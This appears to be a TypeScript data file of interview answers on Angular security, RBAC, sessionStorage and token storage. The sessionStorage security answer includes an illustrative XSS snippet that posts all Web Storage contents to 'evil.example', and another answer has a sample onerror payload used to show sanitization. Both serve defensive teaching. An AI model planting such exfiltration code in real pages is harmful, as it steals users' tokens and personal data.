import type { AnswerMap } from './answer.model';

export const answers: AnswerMap = {
  'How are you securing your Angular application?': {
    summary:
      'Security is layered: Angular gives XSS protection out of the box (template sanitization, no `eval`-style templates with AOT), and on top of that I add secure authentication (HttpOnly cookies or short-lived tokens via an interceptor), route guards for UX, CSRF protection, a Content Security Policy, HTTPS, dependency auditing — and, crucially, the backend enforces every authorization rule because anything in the browser can be bypassed.',
    details: [
      {
        type: 'paragraph',
        text: 'A good answer separates what Angular does for you, what you configure in the app, and what must live on the server. The frontend can only make attacks harder and the UX safer; the real security boundary is the API.',
      },
      { type: 'heading3', text: "1. XSS — Angular's built-in sanitization" },
      {
        type: 'code',
        lang: 'typescript',
        code: `@Component({
  template: \`
    <!-- Interpolation is always escaped: <script> shows as text -->
    <p>{{ comment }}</p>

    <!-- [innerHTML] is sanitized: <script> and onerror= are stripped (with a dev-mode warning) -->
    <div [innerHTML]="comment"></div>
  \`,
})
export class CommentComponent {
  comment = '<img src=x onerror="alert(1)"> hello';
}

// ⚠️ Bypassing is explicit and should be rare + reviewed
const trusted = this.sanitizer.bypassSecurityTrustHtml(serverHtmlFromTrustedCms);`,
      },
      {
        type: 'bullets',
        items: [
          'Never build templates from user input or touch the DOM directly with `ElementRef.nativeElement.innerHTML = …`; use bindings or `Renderer2`.',
          'Avoid `bypassSecurityTrust*` unless the content is from a trusted source — and sanitize on the server too (e.g. DOMPurify for rich text).',
          'Enable **Trusted Types** and a strict **CSP** (Angular supports both; the CLI can add a nonce with `autoCsp` / `ngCspNonce`).',
        ],
      },
      { type: 'heading3', text: '2. Authentication & tokens' },
      {
        type: 'code',
        lang: 'typescript',
        code: `// Functional interceptor attaches the token only to our own API
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const auth = inject(AuthService);
  const token = auth.accessToken();               // kept in memory (signal), not localStorage
  if (!token || !req.url.startsWith(environment.apiUrl)) return next(req);
  return next(req.clone({ setHeaders: { Authorization: \`Bearer \${token}\` } })).pipe(
    catchError((err: HttpErrorResponse) => {
      if (err.status === 401) auth.logout();      // or try a silent refresh
      return throwError(() => err);
    }),
  );
};`,
      },
      {
        type: 'paragraph',
        text: "Prefer OAuth2/OIDC with Authorization Code + PKCE (via a library like `angular-oauth2-oidc` or the provider's SDK), or a BFF (backend-for-frontend) that keeps tokens server-side and gives the browser an `HttpOnly; Secure; SameSite` session cookie.",
      },
      { type: 'heading3', text: '3. Authorization in the UI (guards) — UX, not security' },
      {
        type: 'code',
        lang: 'typescript',
        code: `export const adminGuard: CanActivateFn = () => {
  const auth = inject(AuthService);
  return auth.hasRole('admin') || inject(Router).createUrlTree(['/forbidden']);
};
// The API MUST still check the role — anyone can edit JS in DevTools.`,
      },
      { type: 'heading3', text: '4. Other layers' },
      {
        type: 'bullets',
        items: [
          "**CSRF**: if you use cookies, Angular's `HttpClient` reads an `XSRF-TOKEN` cookie and sends `X-XSRF-TOKEN` (`withXsrfConfiguration()`); combine with `SameSite` cookies.",
          '**HTTPS everywhere** + security headers (HSTS, `X-Content-Type-Options`, `frame-ancestors` in CSP to stop clickjacking).',
          '**No secrets in the bundle**: `environment.ts` is public — API keys there are visible to anyone.',
          '**Dependencies**: `npm audit`, Dependabot/Renovate, keep Angular up to date (security fixes land in supported versions).',
          '**Validate input** on the client for UX and on the server for security; avoid leaking stack traces in error messages.',
          "Disable source maps in production or don't serve them publicly, and remove sensitive `console.log`s.",
        ],
      },
      {
        type: 'flow',
        title: 'Defense in depth for an Angular app',
        code: `flowchart LR
  U["User input"]:::client --> S["Angular sanitization<br/>+ CSP / Trusted Types"]:::security
  S --> G["Route guards<br/>(UX only)"]:::client
  G --> I["Auth interceptor<br/>token / XSRF header"]:::network
  I --> API["API: authN + authZ<br/>+ input validation"]:::server
  API --> DB[("Data")]:::db`,
      },
      {
        type: 'callout',
        variant: 'tip',
        text: 'Interview tip: say explicitly "the frontend is not a security boundary — guards and hidden buttons are UX; the API enforces permissions." Interviewers often probe for exactly this.',
      },
    ],
  },

  'How to implement role-based access control in Angular?': {
    summary:
      "Load the user's roles/permissions after login (from the ID token claims or a `/me` endpoint) into an auth service, then use them in three places: functional route guards (`canActivate`, `canMatch`) to block navigation, a structural directive or `@if` to show/hide UI, and an interceptor to handle 401/403. The backend must enforce the same rules — Angular RBAC is only for user experience.",
    details: [
      {
        type: 'paragraph',
        text: 'RBAC means access is decided by roles (admin, editor, viewer) or, more flexibly, by permissions attached to roles (`orders:delete`). Checking permissions instead of role names keeps the UI stable when the business adds new roles.',
      },
      { type: 'heading3', text: 'Auth service holding the current user' },
      {
        type: 'code',
        lang: 'typescript',
        code: `export type Role = 'admin' | 'editor' | 'viewer';
interface CurrentUser { id: string; roles: Role[]; permissions: string[] }

@Injectable({ providedIn: 'root' })
export class AuthService {
  private http = inject(HttpClient);
  readonly user = signal<CurrentUser | null>(null);
  readonly isLoggedIn = computed(() => this.user() !== null);

  loadUser() {
    return this.http.get<CurrentUser>('/api/me').pipe(tap((u) => this.user.set(u)));
  }
  hasRole(...roles: Role[]) {
    return roles.some((r) => this.user()?.roles.includes(r));
  }
  can(permission: string) {
    return this.user()?.permissions.includes(permission) ?? false;
  }
}`,
      },
      { type: 'heading3', text: 'Functional guard driven by route data' },
      {
        type: 'code',
        lang: 'typescript',
        code: `export const roleGuard: CanActivateFn & CanMatchFn = (route) => {
  const auth = inject(AuthService);
  const router = inject(Router);
  const allowed = (route.data?.['roles'] ?? []) as Role[];

  if (!auth.isLoggedIn()) return router.createUrlTree(['/login']);
  return auth.hasRole(...allowed) || router.createUrlTree(['/forbidden']);
};

// app.routes.ts
export const routes: Routes = [
  {
    path: 'admin',
    canMatch: [roleGuard],                // lazy chunk isn't even downloaded for non-admins
    data: { roles: ['admin'] },
    loadChildren: () => import('./admin/admin.routes'),
  },
  { path: 'reports', canActivate: [roleGuard], data: { roles: ['admin', 'editor'] }, component: ReportsComponent },
];`,
      },
      { type: 'heading3', text: 'Show/hide UI with a structural directive' },
      {
        type: 'code',
        lang: 'typescript',
        code: `@Directive({ selector: '[appHasPermission]' })
export class HasPermissionDirective {
  private tpl = inject(TemplateRef<unknown>);
  private vcr = inject(ViewContainerRef);
  private auth = inject(AuthService);
  readonly appHasPermission = input.required<string>();

  constructor() {
    effect(() => {
      this.vcr.clear();
      if (this.auth.can(this.appHasPermission())) this.vcr.createEmbeddedView(this.tpl);
    });
  }
}

// usage
// <button *appHasPermission="'orders:delete'" (click)="delete()">Delete</button>
// or simply: @if (auth.can('orders:delete')) { <button>Delete</button> }`,
      },
      {
        type: 'flow',
        title: 'RBAC request flow',
        code: `sequenceDiagram
  participant U as User
  participant R as Router + roleGuard
  participant A as AuthService
  participant API as Backend API
  U->>R: navigate to /admin
  R->>A: hasRole('admin')?
  A-->>R: false
  R-->>U: redirect /forbidden
  U->>API: crafted DELETE /orders/7
  API-->>U: 403 Forbidden (server enforces RBAC)`,
      },
      {
        type: 'bullets',
        items: [
          'Make sure roles are loaded before guards run — e.g. load `/me` in `provideAppInitializer()` or make the guard return an Observable that waits for the user.',
          "Use `canMatch` for lazy routes so unauthorized users don't download the feature bundle; `canActivateChild` to protect a whole subtree.",
          'Legacy equivalent: class-based guards implementing `CanActivate` and `*ngIf` — still seen in older codebases.',
          "Handle 403 from the API in an interceptor (toast + redirect) because the UI's view of permissions can be stale.",
        ],
      },
      {
        type: 'callout',
        variant: 'warning',
        text: "Pitfall: reading roles from a JWT stored in localStorage and trusting them on the client is fine for UX, but never for security — the token's payload is readable and the JS can be patched. Every protected API endpoint must re-check the role.",
      },
    ],
  },

  'What is browser Session Storage?': {
    summary:
      "`sessionStorage` is a Web Storage API key-value store (strings only, typically ~5 MB per origin) that is scoped to a single browser tab and origin: data survives page reloads in that tab but is cleared when the tab or window is closed, and it is not shared with other tabs. It's synchronous and accessible to any JavaScript on the page.",
    details: [
      {
        type: 'paragraph',
        text: 'Session storage is part of the Web Storage API alongside `localStorage`. The difference is lifetime and scope: localStorage persists until cleared and is shared across all tabs of the same origin; sessionStorage lives only for the "page session" of one tab.',
      },
      { type: 'heading3', text: 'API' },
      {
        type: 'code',
        lang: 'typescript',
        code: `sessionStorage.setItem('wizardStep', '2');
sessionStorage.getItem('wizardStep');   // '2'  (string | null)
sessionStorage.removeItem('wizardStep');
sessionStorage.clear();                 // remove everything for this origin+tab
sessionStorage.length;                  // number of keys
sessionStorage.key(0);                  // name of the first key`,
      },
      { type: 'heading3', text: 'Lifetime rules' },
      {
        type: 'bullets',
        items: [
          '✅ Survives reload and back/forward navigation in the same tab.',
          '❌ Cleared when the tab/window is closed.',
          '❌ Not shared between tabs — opening the same URL in a new tab starts with empty storage.',
          'Duplicating a tab (or some "open in new tab" flows via `window.open`) **copies** the current sessionStorage into the new tab; after that they are independent.',
          'Scoped per **origin** (protocol + host + port): `http://app.com` and `https://app.com` are separate.',
          'Some browsers restore session storage when you reopen a closed tab or restore a session.',
        ],
      },
      { type: 'heading3', text: 'Comparison with other storage' },
      {
        type: 'bullets',
        items: [
          '**sessionStorage**: per tab, ~5 MB, strings, sync, JS-readable.',
          '**localStorage**: per origin across tabs, persists forever, ~5–10 MB, strings, sync, JS-readable; fires a `storage` event in other tabs.',
          '**Cookies**: ~4 KB, sent with every HTTP request, can be `HttpOnly` (not JS-readable), have expiry.',
          '**IndexedDB**: large, async, stores structured objects/blobs — for offline data.',
        ],
      },
      { type: 'heading3', text: 'Angular-friendly usage (SSR-safe)' },
      {
        type: 'code',
        lang: 'typescript',
        code: `@Injectable({ providedIn: 'root' })
export class SessionStore {
  private isBrowser = isPlatformBrowser(inject(PLATFORM_ID));

  get(key: string): string | null {
    return this.isBrowser ? sessionStorage.getItem(key) : null; // no sessionStorage on the server
  }
  set(key: string, value: string) {
    if (this.isBrowser) sessionStorage.setItem(key, value);
  }
}`,
      },
      {
        type: 'callout',
        variant: 'tip',
        text: 'Good use cases: multi-step form progress, a per-tab filter state, a "return to this URL after login" value. Mention that it is synchronous (blocks the main thread on big writes) and unavailable during SSR.',
      },
    ],
  },

  'What types of data (`strings vs objects`) can you store in browser Session Storage?': {
    summary:
      'Only strings — both keys and values. Any other value is converted with `String()`, so an object becomes `"[object Object]"` and a number becomes `"42"`. To store objects or arrays you serialize with `JSON.stringify()` and parse back with `JSON.parse()`, keeping in mind that Dates, Maps, Sets, functions, class instances and `undefined` don\'t survive JSON round-tripping.',
    details: [
      {
        type: 'paragraph',
        text: "The Web Storage API is a string-to-string map. It doesn't throw if you pass a non-string — it silently coerces it, which is a classic bug.",
      },
      { type: 'heading3', text: 'The coercion trap' },
      {
        type: 'code',
        lang: 'typescript',
        code: `sessionStorage.setItem('user', { id: 1 } as any);
sessionStorage.getItem('user');        // "[object Object]"  ❌ data lost

sessionStorage.setItem('count', 42 as any);
sessionStorage.getItem('count');       // "42" — a string, not a number
sessionStorage.getItem('count') + 1;   // "421" 😬

sessionStorage.setItem('flag', false as any);
if (sessionStorage.getItem('flag')) {} // "false" is truthy → branch runs!`,
      },
      { type: 'heading3', text: 'Storing objects correctly with JSON' },
      {
        type: 'code',
        lang: 'typescript',
        code: `const cart = { items: [{ sku: 'A1', qty: 2 }], updatedAt: new Date() };
sessionStorage.setItem('cart', JSON.stringify(cart));

const raw = sessionStorage.getItem('cart');
const restored = raw ? JSON.parse(raw) : null;
restored.items[0].qty;        // 2 ✅
restored.updatedAt;           // "2026-11-05T10:00:00.000Z" — a STRING, not a Date`,
      },
      { type: 'heading3', text: 'A typed, safe wrapper' },
      {
        type: 'code',
        lang: 'typescript',
        code: `export function readJson<T>(key: string, fallback: T): T {
  try {
    const raw = sessionStorage.getItem(key);
    return raw === null ? fallback : (JSON.parse(raw) as T);
  } catch {
    return fallback;               // corrupted / manually edited value
  }
}

export function writeJson(key: string, value: unknown): void {
  try {
    sessionStorage.setItem(key, JSON.stringify(value));
  } catch (e) {
    // QuotaExceededError (~5 MB limit) or storage disabled (some private modes)
    console.warn('Could not persist', key, e);
  }
}`,
      },
      { type: 'heading3', text: 'What does not survive JSON' },
      {
        type: 'bullets',
        items: [
          '`Date` → ISO string (revive it manually or with a `JSON.parse` reviver).',
          '`Map`/`Set` → `{}` — convert to arrays first: `[...map]`.',
          'Functions, `undefined` and `Symbol` properties are dropped; class instances lose their prototype/methods.',
          '`NaN`/`Infinity` → `null`; `BigInt` throws; circular references throw.',
          'Binary data (files, blobs) — use IndexedDB instead of base64-encoding into storage.',
        ],
      },
      {
        type: 'callout',
        variant: 'warning',
        text: 'Pitfall: always treat stored data as untrusted input — users can edit it in DevTools. Validate the parsed shape (and wrap `JSON.parse` in try/catch) before using it.',
      },
    ],
  },

  'Is it secure or recommended to store sensitive or personal data (`PII/tokens`) in browser Session Storage?':
    {
      summary:
        "No, not for anything that would be harmful if stolen. Session storage is readable by any JavaScript running on the origin, so a single XSS bug (or a compromised third-party script) can exfiltrate it; it is also unencrypted on disk and visible in DevTools. It's slightly better than localStorage only because it disappears when the tab closes. Prefer `HttpOnly; Secure; SameSite` cookies or a BFF for tokens, keep access tokens in memory if you must handle them in JS, and avoid storing PII client-side at all.",
      details: [
        {
          type: 'paragraph',
          text: 'The threat model matters: storage APIs protect data from **other origins**, not from code running on **your** origin. Any script your page executes — your bundle, an analytics tag, an npm dependency, or injected XSS — can call `sessionStorage.getItem()`.',
        },
        { type: 'heading3', text: 'How an XSS steals it' },
        {
          type: 'code',
          lang: 'javascript',
          code: `// One injected line is enough — no user interaction needed
fetch('https://evil.example/collect', {
  method: 'POST',
  body: JSON.stringify({ ...sessionStorage, ...localStorage }),
});
// An HttpOnly cookie would NOT be readable here: document.cookie hides it.`,
        },
        { type: 'heading3', text: 'Risks summarised' },
        {
          type: 'bullets',
          items: [
            '**XSS / supply-chain scripts** can read and send it anywhere.',
            '**No encryption at rest** — stored in the browser profile on disk; shared or compromised machines expose it.',
            '**Visible in DevTools**, screen-sharing, browser extensions with page access.',
            '**Compliance**: storing PII (emails, addresses, health data, national IDs) client-side widens your GDPR/HIPAA/PCI scope; card data must never be stored.',
            "Client-side encryption doesn't really help — the key has to live in the same JS that an attacker controls.",
          ],
        },
        { type: 'heading3', text: 'What to do instead' },
        {
          type: 'bullets',
          items: [
            '**Tokens**: refresh token in an `HttpOnly; Secure; SameSite=Strict/Lax` cookie; short-lived access token kept **in memory** (a service/signal) and refreshed silently. Or a **BFF** so the browser only ever holds a session cookie.',
            "**PII**: fetch it when needed and keep it in memory; don't cache it in Web Storage.",
            '**Acceptable in sessionStorage**: non-sensitive UI state — wizard step, filters, a post-login redirect URL, a feature-flag override.',
            'Reduce XSS risk regardless: Angular sanitization, strict CSP, Trusted Types, few third-party scripts.',
          ],
        },
        {
          type: 'flow',
          title: 'Where should this data live?',
          code: `flowchart TD
  Q{"Harmful if stolen?<br/>(token, PII, payment)"} -->|No| UI["sessionStorage / localStorage<br/>(UI state, preferences)"]:::cache
  Q -->|Yes| T{"Needs to be read by JS?"}
  T -->|No| C["HttpOnly Secure SameSite cookie<br/>or server session via BFF"]:::security
  T -->|Yes, briefly| M["In-memory only<br/>(service / signal), short TTL"]:::highlight`,
        },
        {
          type: 'callout',
          variant: 'tip',
          text: "Interview tip: acknowledge the trade-off honestly — many SPAs do keep JWTs in sessionStorage because it's simple. Say it is acceptable only with short-lived tokens and strong XSS defences, and that HttpOnly cookies (with CSRF protection) or a BFF is the more secure design.",
        },
      ],
    },

  'Where do you store authentication tokens? Session Storage vs Local Storage, and can tokens be stored in a service using RxJS Observables?':
    {
      summary:
        'Most secure: let the server set the token (or a session id) in an `HttpOnly; Secure; SameSite` cookie, ideally through a BFF. If the SPA must handle tokens, keep the short-lived access token in memory — yes, in a singleton service using a `BehaviorSubject` or signal — and the refresh token in an HttpOnly cookie. Between the two Web Storage options, sessionStorage is less exposed (per tab, cleared on close) than localStorage (persistent, shared), but both are readable by XSS.',
      details: [
        {
          type: 'paragraph',
          text: 'There is no perfect place — each option trades XSS exposure, CSRF exposure and UX (does the user stay logged in after refresh or across tabs?). Interviewers want to see that you know the trade-offs and the common hybrid pattern.',
        },
        { type: 'heading3', text: 'Comparison' },
        {
          type: 'bullets',
          items: [
            '**localStorage**: survives restarts and is shared across tabs (good UX), but readable by any script → highest XSS impact; a stolen long-lived token works until it expires.',
            '**sessionStorage**: per tab, cleared on close → smaller window, but still XSS-readable; user must log in again in each new tab.',
            "**In-memory (service)**: not persisted anywhere, so it's gone on refresh — XSS can still use it while the page is running, but cannot easily harvest it later; needs a silent refresh on reload.",
            '**HttpOnly cookie**: invisible to JS (immune to token theft via XSS), sent automatically → needs CSRF protection (`SameSite`, XSRF token). Works best when API and app share a site or via a BFF.',
          ],
        },
        { type: 'heading3', text: 'Yes — an in-memory token service with RxJS' },
        {
          type: 'code',
          lang: 'typescript',
          code: `@Injectable({ providedIn: 'root' })        // singleton → one token for the whole app
export class TokenService {
  private http = inject(HttpClient);
  private readonly token$ = new BehaviorSubject<string | null>(null);

  readonly accessToken$ = this.token$.asObservable();          // read-only for consumers
  readonly isLoggedIn$ = this.token$.pipe(map(Boolean), distinctUntilChanged());

  get snapshot() { return this.token$.value; }                 // sync read for interceptors

  login(creds: Credentials) {
    // Server returns the access token in the body and sets the refresh token as an HttpOnly cookie
    return this.http.post<{ accessToken: string }>('/auth/login', creds, { withCredentials: true })
      .pipe(tap(({ accessToken }) => this.token$.next(accessToken)));
  }

  refresh() {   // called on app start (page reload) and on 401
    return this.http.post<{ accessToken: string }>('/auth/refresh', {}, { withCredentials: true })
      .pipe(tap(({ accessToken }) => this.token$.next(accessToken)));
  }

  logout() { this.token$.next(null); }
}`,
        },
        {
          type: 'code',
          lang: 'typescript',
          code: `// Interceptor reads the in-memory token
export const tokenInterceptor: HttpInterceptorFn = (req, next) => {
  const token = inject(TokenService).snapshot;
  return next(token ? req.clone({ setHeaders: { Authorization: \`Bearer \${token}\` } }) : req);
};

// Modern alternative to BehaviorSubject: a signal
// readonly accessToken = signal<string | null>(null);`,
        },
        {
          type: 'flow',
          title: 'Hybrid pattern: memory + HttpOnly refresh cookie',
          code: `sequenceDiagram
  participant SPA as Angular (TokenService)
  participant API as Auth API
  SPA->>API: POST /auth/login
  API-->>SPA: accessToken (body) + Set-Cookie refresh (HttpOnly)
  Note over SPA: token kept in BehaviorSubject (memory)
  SPA->>API: GET /orders + Bearer token
  Note over SPA: page reload → memory cleared
  SPA->>API: POST /auth/refresh (cookie sent automatically)
  API-->>SPA: new accessToken`,
        },
        {
          type: 'bullets',
          items: [
            'Keep access tokens short-lived (minutes) and rotate refresh tokens.',
            "Use `provideAppInitializer()` to call `refresh()` on startup so a reload doesn't log the user out.",
            "For cross-tab logout, broadcast with `BroadcastChannel` (memory isn't shared across tabs).",
            'An Observable/signal in a service is about **state sharing and reactivity**, not about encryption — it is "secure" only in the sense that it isn\'t persisted to disk or readable from storage.',
          ],
        },
        {
          type: 'callout',
          variant: 'tip',
          text: 'Interview tip: a strong answer is "access token in memory via a `BehaviorSubject`/signal in a root service, refresh token in an HttpOnly cookie, silent refresh on reload — or a BFF if we control the backend; I\'d avoid localStorage for tokens." Then explain why in one sentence each.',
        },
      ],
    },
};
